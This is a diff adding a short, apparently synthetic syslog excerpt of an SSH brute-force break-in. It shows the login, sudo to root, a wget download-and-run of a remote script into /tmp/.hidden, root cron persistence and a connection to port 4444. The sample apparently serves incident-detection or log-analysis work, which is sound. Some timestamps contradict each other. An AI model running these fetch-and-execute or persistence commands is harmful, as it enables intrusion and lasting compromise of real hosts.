@@ -1,0 +1,12 @@
+Jul 29 14:32:01 webserver sshd[12345]: Failed password for root from 185.220.101.47 port 54231 ssh2
+Jul 29 14:32:03 webserver sshd[12345]: Failed password for admin from 185.220.101.47 port 54231 ssh2
+Jul 29 14:32:05 webserver sshd[12345]: Failed password for root from 185.220.101.47 port 54231 ssh2
+Jul 29 14:32:07 webserver sshd[12346]: Accepted password for ubuntu from 185.220.101.47 port 54232 ssh2
+Jul 29 14:32:10 webserver sshd[12346]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jul 29 14:32:15 webserver sudo[12350]: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
+Jul 29 14:32:20 webserver kernel: [123456.789] audit: type=1400 audit(1706538740.123:456): apparmor="DENIED" operation="exec" profile="/usr/sbin/sshd" name="/usr/bin/wget" pid=12355 comm="bash"
+Jul 29 14:32:25 webserver bash[12355]: wget http://95.214.55.138/malware.sh -O /tmp/.hidden
+Jul 29 14:32:30 webserver bash[12355]: chmod +x /tmp/.hidden && /tmp/.hidden
+Jul 29 14:32:45 webserver cron[12360]: (root) CMD (/tmp/.hidden &>/dev/null)
+Jul 29 14:33:01 webserver kernel: suspicious network connection to 94.232.47.182:4444
+Jul 29 14:33:05 webserver auditd[12370]: type=SYSCALL msg=audit(1706538785): arch=c000003e syscall=59 success=yes exe="/bin/bash" key=execve_root
